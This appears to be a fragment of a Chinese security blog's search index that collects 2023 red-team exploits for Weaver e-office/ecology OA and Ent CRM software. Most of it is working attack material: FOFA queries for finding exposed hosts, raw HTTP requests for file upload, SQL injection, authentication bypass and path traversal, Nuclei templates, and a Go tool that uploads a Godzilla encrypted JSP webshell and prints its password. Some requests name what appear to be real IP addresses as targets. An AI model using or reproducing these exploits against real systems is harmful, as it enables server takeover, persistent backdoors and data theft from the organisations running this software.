","date":"2023-12-08","objectID":"/%E6%B3%9B%E5%BE%AEe-mobileserver%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"泛微E-MobileServer远程命令执行漏洞","uri":"/%E6%B3%9B%E5%BE%AEe-mobileserver%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"泛微e-office 未授权访问 ","date":"2023-12-08","objectID":"/%E6%B3%9B%E5%BE%AEe-office-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/:1:0","tags":["2023hw漏洞"],"title":"泛微e-office 未授权访问","uri":"/%E6%B3%9B%E5%BE%AEe-office-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"categories":["2023hw漏洞"],"content":"fofa (body=\"login.php\"\u0026\u0026body=\"eoffice\")||body=\"/general/login/index.php\" ","date":"2023-12-08","objectID":"/%E6%B3%9B%E5%BE%AEe-office-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/:2:0","tags":["2023hw漏洞"],"title":"泛微e-office 未授权访问","uri":"/%E6%B3%9B%E5%BE%AEe-office-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"categories":["2023hw漏洞"],"content":"POC yaml格式 detail: ID: 5285 Author: 匿名作者 Name: 泛微e-office 未授权访问 Description: 泛微e-office是一种企业办公自动化软件解决方案，由中国的泛微网络科技股份有限公司开发和提供。它旨在帮助企业提高办公效率、优化业务流程和信息管理。泛微e-office 存在未授权访问，攻击者可以访问页面获取敏感信息。 Identifier: DVB: DVB-2023-5285 VulnClass: - 认证绕过/未认证 Category: - 应用服务 Manufacturer: 泛微 Product: e-office Type: 1 Status: 1 Scanable: 1 Level: 2 DisclosureDate: '2023-10-18' Is0day: false IncludeExp: false Weakable: false IsXc: false IsCommon: false IsCallBack: false Condition: (body=\"login.php\"\u0026\u0026body=\"eoffice\")||body=\"/general/login/index.php\" Solutions: - 请关注厂商的修复版本，并及时更新到最新版本. poc: relative: req0 session: false requests: - method: GET timeout: 10 path: /building/backmgr/urlpage/mobileurl/config_2.php headers: User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.2597.132 Safari/537.36 follow_redirects: true matches: (code.eq(\"200\") \u0026\u0026 body.contains(\"数据库名\") \u0026\u0026 body.contains(\"用户名\")) ","date":"2023-12-08","objectID":"/%E6%B3%9B%E5%BE%AEe-office-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/:3:0","tags":["2023hw漏洞"],"title":"泛微e-office 未授权访问","uri":"/%E6%B3%9B%E5%BE%AEe-office-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"categories":["2023hw漏洞"],"content":"漏洞复现 /building/backmgr/urlpage/mobileurl/config_2.php ","date":"2023-12-08","objectID":"/%E6%B3%9B%E5%BE%AEe-office-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/:4:0","tags":["2023hw漏洞"],"title":"泛微e-office 未授权访问","uri":"/%E6%B3%9B%E5%BE%AEe-office-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"categories":["2023hw"],"content":"```\rPOST/Emobile/App/Ajax/ajax.php?action=mobile_upload_save HTTP/1.1 Host:192.168.233.10:8082 Cache-Control:max-age=0 Upgrade-Insecure-Requests:1 Origin:null Content-Type:multipart/form-data; boundary=—-WebKitFormBoundarydRVCGWq4Cx3Sq6tt Accept-Encoding:gzip, deflate Accept-Language:en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7 Connection:close ——WebKitFormBoundarydRVCGWq4Cx3Sq6tt Content-Disposition:form-data; name=“upload_quwan”; filename=“1.php.” Content-Type:image/jpeg \u003c?phpphpinfo();?\u003e\r——WebKitFormBoundarydRVCGWq4Cx3Sq6tt ","date":"2023-12-08","objectID":"/%E6%B3%9B%E5%BE%AEe-office9-mobile_upload_save-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2023-2523/:0:0","tags":["2023hw"],"title":"泛微E-Office9 mobile_upload_save 文件上传漏洞 CVE-2023-2523","uri":"/%E6%B3%9B%E5%BE%AEe-office9-mobile_upload_save-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2023-2523/"},{"categories":["2023hw"],"content":"```\rPOST /inc/jquery/uploadify/uploadify.php HTTP/1.1 Host: 192.168.233.10:8082 User-Agent: test Connection: close Content-Length: 493 Accept-Encoding: gzip Content-Type: multipart/form-data ——WebKitFormBoundarydRVCGWq4Cx3Sq6tt Content-Disposition: form-data; name=“Filedata”; filename=“666.php” Content-Type: application/octet-stream \u003c?php phpinfo();?\u003e\r——WebKitFormBoundarydRVCGWq4Cx3Sq6tt ","date":"2023-12-08","objectID":"/%E6%B3%9B%E5%BE%AEe-office9-uploadify.php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2023-2648/:0:0","tags":["2023hw"],"title":"泛微E-Office9 uploadify.php文件上传漏洞 CVE-2023-2648","uri":"/%E6%B3%9B%E5%BE%AEe-office9-uploadify.php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2023-2648/"},{"categories":["2023hw"],"content":"## fofa\r((header=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" \u0026\u0026 body=\"eoffice\") || header=\"Server: eOffice\") \u0026\u0026 body!=\"Server: couchdb\") || banner=\"general/login/index.php\" ","date":"2023-12-08","objectID":"/%E6%B3%9B%E5%BE%AEe-office%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F-download.php-%E6%96%87%E4%BB%B6-filename-%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"泛微E-office协同办公系统 download.php 文件 filename 参数文件读取漏洞","uri":"/%E6%B3%9B%E5%BE%AEe-office%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F-download.php-%E6%96%87%E4%BB%B6-filename-%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc http://122.224.27.187:8082/general/file_folder/file_new/neworedit/download.php?filename=hosts\u0026dir=C:\\Windows\\System32\\drivers\\etc\\ ","date":"2023-12-08","objectID":"/%E6%B3%9B%E5%BE%AEe-office%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F-download.php-%E6%96%87%E4%BB%B6-filename-%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"泛微E-office协同办公系统 download.php 文件 filename 参数文件读取漏洞","uri":"/%E6%B3%9B%E5%BE%AEe-office%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F-download.php-%E6%96%87%E4%BB%B6-filename-%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"https://mp.weixin.qq.com/s/NnoIvietLFkibFwWVN4OuQ\r","date":"2023-12-08","objectID":"/%E6%B3%9B%E5%BE%AEecology-9-mobilepluginbrowser.jsp-sql%E6%B3%A8%E5%85%A5/:0:0","tags":["2023hw"],"title":"泛微ecology 9 mobilepluginbrowser.jsp SQL注入","uri":"/%E6%B3%9B%E5%BE%AEecology-9-mobilepluginbrowser.jsp-sql%E6%B3%A8%E5%85%A5/"},{"categories":["2023hw"],"content":"fofa app=\"泛微-E-Weaver\" ","date":"2023-12-08","objectID":"/%E6%B3%9B%E5%BE%AEecology-9-mobilepluginbrowser.jsp-sql%E6%B3%A8%E5%85%A5/:1:0","tags":["2023hw"],"title":"泛微ecology 9 mobilepluginbrowser.jsp SQL注入","uri":"/%E6%B3%9B%E5%BE%AEecology-9-mobilepluginbrowser.jsp-sql%E6%B3%A8%E5%85%A5/"},{"categories":["2023hw"],"content":"exp POST /mobile/%20/plugin/browser.jsp HTTP/1.1 Host: Accept: */* User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 X-Requested-With: XMLHttpRequest Referer: http://xxxx/wui/index.html Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 2439 isDis=1\u0026browserTypeId=269\u0026keyword=%25%32%35%25%33%36%25%33%31%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%35%25%32%35%25%33%36%25%36%35%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%33%25%33%31%25%32%35%25%33%32%25%36%33%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%36%32%25%32%35%25%33%32%25%33%38%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%30%25%32%35%25%33%36%25%33%31%25%32%35%25%33%37%25%33%33%25%32%35%25%33%37%25%33%33%25%32%35%25%33%37%25%33%37%25%32%35%25%33%36%25%36%36%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%36%25%33%36%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%36%25%33%38%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%36%34%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%33%35%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%36%36%25%32%35%25%33%37%25%33%35%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%34%25%32%35%25%33%36%25%33%31%25%32%35%25%33%36%25%36%35%25%32%35%25%33%36%25%33%31%25%32%35%25%33%36%25%33%37%25%32%35%25%33%36%25%33%35%25%32%35%25%33%37%25%33%32%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%37%25%32%35%25%33%36%25%33%38%25%32%35%25%33%36%25%33%35%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%33%35%25%32%35%25%33%32%25%33%30%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%33%37%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%36%35%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%33%34%25%32%35%25%33%33%25%36%34%25%32%35%25%33%32%25%33%37%25%32%35%25%33%37%25%33%33%25%32%35%25%33%37%25%33%39%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%31%25%32%35%25%33%36%25%33%34%25%32%35%25%33%36%25%36%34%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%36%35%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%39%25%32%35%25%33%32%25%36%32%25%32%35%25%33%32%25%33%37 ","date":"2023-12-08","objectID":"/%E6%B3%9B%E5%BE%AEecology-9-mobilepluginbrowser.jsp-sql%E6%B3%A8%E5%85%A5/:2:0","tags":["2023hw"],"title":"泛微ecology 9 mobilepluginbrowser.jsp SQL注入","uri":"/%E6%B3%9B%E5%BE%AEecology-9-mobilepluginbrowser.jsp-sql%E6%B3%A8%E5%85%A5/"},{"categories":["2023hw"],"content":"## fofa\r(header=\"testBanCookie\" || banner=\"testBanCookie\" || body=\"/wui/common/css/w7OVFont.css\" || (body=\"typeof poppedWindow\" \u0026\u0026 body=\"client/jquery.client_wev8.js\") || body=\"/theme/ecology8/jquery/js/zDialog_wev8.js\" || body=\"ecology8/lang/weaver_lang_7_wev8.js\") ","date":"2023-12-08","objectID":"/%E6%B3%9B%E5%BE%AEoa%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F-pluginviewservlet-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"泛微OA办公系统 PluginViewServlet 认证绕过漏洞","uri":"/%E6%B3%9B%E5%BE%AEoa%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F-pluginviewservlet-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc POST /mobilemode/public.jsp HTTP/1.1 Host: 183.240.31.87 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip Content-Length: 80 from=QRCode\u0026url=CC4DFA20F3CF7CF61F86C43FA6A84C7020E42052CDB6847AEF9362D0FA570CB7 POST /weaver/weaver.mobile.plugin.ecology.service.PluginViewServlet/.css HTTP/1.1 Host: 183.230.46.191 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip Content-Length: 47 sessionkey=c332c050-2c22-4bd2-a648-87afd0a58387 ","date":"2023-12-08","objectID":"/%E6%B3%9B%E5%BE%AEoa%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F-pluginviewservlet-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"泛微OA办公系统 PluginViewServlet 认证绕过漏洞","uri":"/%E6%B3%9B%E5%BE%AEoa%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F-pluginviewservlet-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"浙大恩特客户资源管理系统 文件上传和sql注入漏洞 ","date":"2023-12-08","objectID":"/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9%E5%AE%A2%E6%88%B7%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%92%8Csql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"浙大恩特客户资源管理系统 文件上传和sql注入漏洞","uri":"/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9%E5%AE%A2%E6%88%B7%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%92%8Csql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"特征 app.name=\"浙大恩特 CRM\" app=\"浙大恩特客户资源管理系统\" ","date":"2023-12-08","objectID":"/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9%E5%AE%A2%E6%88%B7%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%92%8Csql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"浙大恩特客户资源管理系统 文件上传和sql注入漏洞","uri":"/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9%E5%AE%A2%E6%88%B7%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%92%8Csql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"SQL注入 id: enter-T0140_editAction-api-sqli info: name: 浙大恩特客户资源管理系统T0140_editAction.entweb;.js接口sql注入漏洞 author: YGnight severity: high description: description reference: - https:// metadata: verified: true max-request: 1 fofa-query: app=\"浙大恩特客户资源管理系统\" requests: - raw: - |+ GET /entsoft/T0140_editAction.entweb;.js?method=getdocumentnumFlag\u0026documentnum=1 HTTP/1.1 Host: {{Hostname}} User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Connection: close Cookie: JSESSIONID=1DAEEF5E703FF40871BD44A67C1EEDD5; JSESSIONID=2C6DAAA80F315B114CD65C9DA80D8D8C Upgrade-Insecure-Requests: 1 matchers-condition: and matchers: - type: status status: - 200 - type: word words: - '0' ","date":"2023-12-08","objectID":"/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9%E5%AE%A2%E6%88%B7%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%92%8Csql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"浙大恩特客户资源管理系统 文件上传和sql注入漏洞","uri":"/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9%E5%AE%A2%E6%88%B7%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%92%8Csql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"文件上传1 id: enter-machord_doc-api-fileupload info: name: 浙大恩特客户资源管理系统machord_doc.jsp;.js接口任意文件上传 author: YGnight severity: high description: description reference: - https:// metadata: verified: true max-request: 1 fofa-query: app=\"浙大恩特客户资源管理系统\" requests: - raw: - |- POST /entsoft_en/Storage/machord_doc.jsp;.js?formID=upload\u0026machordernum=\u0026fileName=night.jsp\u0026strAffixStr=\u0026oprfilenam=null\u0026gesnum= HTTP/1.1 Host: {{Hostname}} User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0 uacq Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Content-Type: multipart/form-data; boundary=----4225820000370152680749129212 Content-Length: 548 ------4225820000370152680749129212 Content-Disposition: form-data; name=\"oprfilenam\" null ------4225820000370152680749129212 Content-Disposition: form-data; name=\"uploadflg\" 0 ------4225820000370152680749129212 Content-Disposition: form-data; name=\"strAffixStr\" ------4225820000370152680749129212 Content-Disposition: form-data; name=\"selfilenam\" ------4225820000370152680749129212 Content-Disposition: form-data; name=\"uploadfile\"; filename=\"night.jsp\" Content-Type: image/png night ------4225820000370152680749129212-- matchers-condition: and matchers: - type: status status: - 200 - type: word words: - 'night.jsp' ","date":"2023-12-08","objectID":"/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9%E5%AE%A2%E6%88%B7%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%92%8Csql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw漏洞"],"title":"浙大恩特客户资源管理系统 文件上传和sql注入漏洞","uri":"/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9%E5%AE%A2%E6%88%B7%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%92%8Csql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"文件上传2 package main import ( \"bytes\" \"crypto/md5\" \"crypto/tls\" \"encoding/json\" \"fmt\" \"github.com/hpifu/go-kit/hflag\" \"github.com/liushuochen/gotable\" \"github.com/thanhpk/randstr\" \"io/ioutil\" \"mime/multipart\" \"net/http\" \"os\" \"strings\" \"time\" ) type Resutl struct { VisitRoot string `json:\"visitRoot\"` FileName string `json:\"fileName\"` Path string `json:\"path\"` IsImage bool `json:\"isImage\"` Msg string `json:\"msg\"` } func main() { context, password, key := initGodZillaShell() str := gethost() s := exploit(str, context) shellURL := strings.Replace(str+s, \"//ent\", \"/ent\", 1) tb, _ := gotable.Create(\"ShellURL\", \"ShellPass\", \"ShellKey\") _ = tb.AddRow([]string{ shellURL, password, key, }) fmt.Println(tb) } func initGodZillaShell() (shellContext, shellPassword, shellKey string) { password := randstr.Hex(12) safeKey := randstr.Hex(6) md5Key := fmt.Sprintf(\"%x\", md5.Sum([]byte(safeKey)))[0:16] shellContent := \"\u003c%! String xc=\\\"\" + md5Key + \"\\\"; String pass=\\\"\" + password + \"\\\"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(\\\"AES\\\");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),\\\"AES\\\"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(\\\"MD5\\\");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName(\\\"java.util.Base64\\\");Object Encoder = base64.getMethod(\\\"getEncoder\\\", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod(\\\"encodeToString\\\", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName(\\\"sun.misc.BASE64Encoder\\\"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod(\\\"encode\\\", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName(\\\"java.util.Base64\\\");Object decoder = base64.getMethod(\\\"getDecoder\\\", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod(\\\"decode\\\", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName(\\\"sun.misc.BASE64Decoder\\\"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod(\\\"decodeBuffer\\\", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%\u003e\u003c%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute(\\\"payload\\\")==null){session.setAttribute(\\\"payload\\\",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute(\\\"parameters\\\",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute(\\\"payload\\\")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}\\n%\u003e\" return shellContent, password, safeKey } func gethost() string { hflag.AddFlag(\"target\", \"浙大恩特地址\", hflag.Required(), hflag.Shorthand(\"t\")) if err := hflag.Parse(); err != nil { fmt.Println(hflag.Usage()) os.Exit(0) } return hflag.GetString(\"target\") } func cli() *http.Client { c := \u0026http.Client{Transport: \u0026http.Transport{TLSClientConfig: \u0026tls.Config{InsecureSkipVerify: true}}} c.Timeout = time.Second * 15 return c } fun","date":"2023-12-08","objectID":"/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9%E5%AE%A2%E6%88%B7%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%92%8Csql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:5:0","tags":["2023hw漏洞"],"title":"浙大恩特客户资源管理系统 文件上传和sql注入漏洞","uri":"/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9%E5%AE%A2%E6%88%B7%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%92%8Csql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"文件上传3 POST /entsoft_en/entereditor/jsp/fileupload.jsp?filename=plugins.jsp HTTP/1.1 Host: xxxxxxxx User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0 uacq Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 8 1111 ","date":"2023-12-08","objectID":"/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9%E5%AE%A2%E6%88%B7%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%92%8Csql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:6:0","tags":["2023hw漏洞"],"title":"浙大恩特客户资源管理系统 文件上传和sql注入漏洞","uri":"/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9%E5%AE%A2%E6%88%B7%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%92%8Csql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"文件上传4 POST /entsoft/CustomerAction.entphone;.js?method=loadFile HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0 uacq Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye8FPHsIAq9JN8j2A Content-Length: 203 ------WebKitFormBoundarye8FPHsIAq9JN8j2A Content-Disposition: form-data; name=\"file\";filename=\"as.jsp\" Content-Type: image/jpeg \u003c%out.print(\"test\");%\u003e ------WebKitFormBoundarye8FPHsIAq9JN8j2A-- ","date":"2023-12-08","objectID":"/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9%E5%AE%A2%E6%88%B7%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%92%8Csql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:7:0","tags":["2023hw漏洞"],"title":"浙大恩特客户资源管理系统 文件上传和sql注入漏洞","uri":"/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9%E5%AE%A2%E6%88%B7%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%92%8Csql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"海康威视IVMS-8700 